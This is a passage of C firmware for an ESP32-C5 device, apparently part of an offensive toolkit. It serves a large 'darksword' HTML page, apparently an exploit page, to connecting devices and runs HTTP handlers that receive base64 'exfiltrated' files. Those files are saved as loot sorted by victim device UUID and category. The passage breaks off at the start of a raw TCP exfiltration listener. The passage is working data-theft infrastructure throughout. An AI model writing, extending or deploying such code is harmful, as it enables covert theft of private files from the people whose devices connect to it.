brokali/projectZeroTouch/ESP32C5/main/main.c
// HTTP handler: serve darksword HTML with chunked transfer (2+ MB)
static esp_err_t darksword_page_handler(httpd_req_t *req) {
    if (!darksword_html || darksword_html_len == 0) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "HTML not loaded");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache");
    if (darksword_html_gzipped) {
        httpd_resp_set_hdr(req, "Content-Encoding", "gzip");
    }

    // With gzip (~50-150 KB) the transfer is much faster and more reliable
    const size_t chunk = 4096;
    size_t sent = 0;
    while (sent < darksword_html_len) {
        size_t remaining = darksword_html_len - sent;
        size_t to_send = remaining < chunk ? remaining : chunk;
        esp_err_t err = httpd_resp_send_chunk(req, darksword_html + sent, to_send);
        if (err != ESP_OK) {
            MY_LOG_INFO(TAG, "DS: chunk send error at offset %u", (unsigned)sent);
            httpd_resp_send_chunk(req, NULL, 0);
            return ESP_FAIL;
        }
        sent += to_send;
    }
    httpd_resp_send_chunk(req, NULL, 0);
    return ESP_OK;
}

// Save one exfiltrated file to /sdcard/loot/portal/<category>/<filename>
static void darksword_save_loot(const char *json_body, size_t json_len) {
    cJSON *root = cJSON_ParseWithLength(json_body, json_len);
    if (!root) {
        MY_LOG_INFO(TAG, "DS loot: JSON parse failed");
        return;
    }

    const cJSON *j_path = cJSON_GetObjectItem(root, "path");
    const cJSON *j_cat  = cJSON_GetObjectItem(root, "category");
    const cJSON *j_data = cJSON_GetObjectItem(root, "data");
    const cJSON *j_uuid = cJSON_GetObjectItem(root, "deviceUUID");

    if (!cJSON_IsString(j_path) || !cJSON_IsString(j_data)) {
        MY_LOG_INFO(TAG, "DS loot: missing path/data");
        cJSON_Delete(root);
        return;
    }

    const char *category = (cJSON_IsString(j_cat) && j_cat->valuestring[0])
                            ? j_cat->valuestring : "misc";
    const char *uuid_str = (cJSON_IsString(j_uuid) && j_uuid->valuestring[0])
                            ? j_uuid->valuestring : "unknown";

    // Build directory: /sdcard/loot/portal/<uuid>/<category>/
    char dir[256];
    snprintf(dir, sizeof(dir), "/sdcard/loot/portal/%s/%s", uuid_str, category);

    // Recursive mkdir (up to 4 levels)
    {
        char tmp[256];
        snprintf(tmp, sizeof(tmp), "%s", dir);
        for (char *p = tmp + 1; *p; p++) {
            if (*p == '/') {
                *p = '\0';
                mkdir(tmp, 0755);
                *p = '/';
            }
        }
        mkdir(tmp, 0755);
    }

    // Derive filename from path (last component)
    const char *fname = strrchr(j_path->valuestring, '/');
    fname = fname ? fname + 1 : j_path->valuestring;
    if (!fname[0]) fname = "data.bin";

    char filepath[320];
    snprintf(filepath, sizeof(filepath), "%s/%s", dir, fname);

    // Base64-decode data
    const char *b64 = j_data->valuestring;
    size_t b64_len = strlen(b64);
    size_t decoded_len = 0;

    // First pass: get decoded length
    if (mbedtls_base64_decode(NULL, 0, &decoded_len, (const unsigned char *)b64, b64_len) != MBEDTLS_ERR_BASE64_BUFFER_TOO_SMALL && decoded_len == 0) {
        MY_LOG_INFO(TAG, "DS loot: base64 length check failed");
        cJSON_Delete(root);
        return;
    }

    uint8_t *decoded = (uint8_t *)heap_caps_malloc(decoded_len, MALLOC_CAP_SPIRAM);
    if (!decoded) {
        decoded = (uint8_t *)malloc(decoded_len);
    }
    if (!decoded) {
        MY_LOG_INFO(TAG, "DS loot: alloc %u failed", (unsigned)decoded_len);
        cJSON_Delete(root);
        return;
    }

    size_t olen = 0;
    int rc = mbedtls_base64_decode(decoded, decoded_len, &olen,
                                    (const unsigned char *)b64, b64_len);
    if (rc != 0) {
        MY_LOG_INFO(TAG, "DS loot: base64 decode error %d", rc);
        free(decoded);
        cJSON_Delete(root);
        return;
    }

    FILE *f = fopen(filepath, "wb");
    if (!f) {
        MY_LOG_INFO(TAG, "DS loot: cannot write %s", filepath);
        free(decoded);
        cJSON_Delete(root);
        return;
    }
    fwrite(decoded, 1, olen, f);
    fflush(f);
    fclose(f);
    sd_sync();

    MY_LOG_INFO(TAG, "DS loot: saved %s (%u bytes) [%s]", filepath, (unsigned)olen, category);
    free(decoded);
    cJSON_Delete(root);
}

// HTTP POST /stats handler — exfil data arriving on port 80
static esp_err_t darksword_stats_handler(httpd_req_t *req) {
    // Allow CORS preflight
    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Methods", "POST, OPTIONS");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Headers", "Content-Type");

    if (req->method == HTTP_OPTIONS) {
        httpd_resp_send(req, NULL, 0);
        return ESP_OK;
    }

    int total = req->content_len;
    if (total <= 0 || total > 2 * 1024 * 1024) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad length");
        return ESP_FAIL;
    }

    char *body = (char *)heap_caps_malloc(total + 1, MALLOC_CAP_SPIRAM);
    if (!body) body = (char *)malloc(total + 1);
    if (!body) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM");
        return ESP_FAIL;
    }

    int received = 0;
    while (received < total) {
        int r = httpd_req_recv(req, body + received, total - received);
        if (r <= 0) {
            free(body);
            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Recv error");
            return ESP_FAIL;
        }
        received += r;
    }
    body[received] = '\0';

    darksword_save_loot(body, (size_t)received);
    free(body);

    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, "{\"status\":\"ok\"}", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Raw TCP exfiltration listener on port 8080
// Accepts connections, reads HTTP-like POST /stats, extracts JSON body
static void darksword_exfil_task(void *pvParameters) {
    (void)pvParameters;

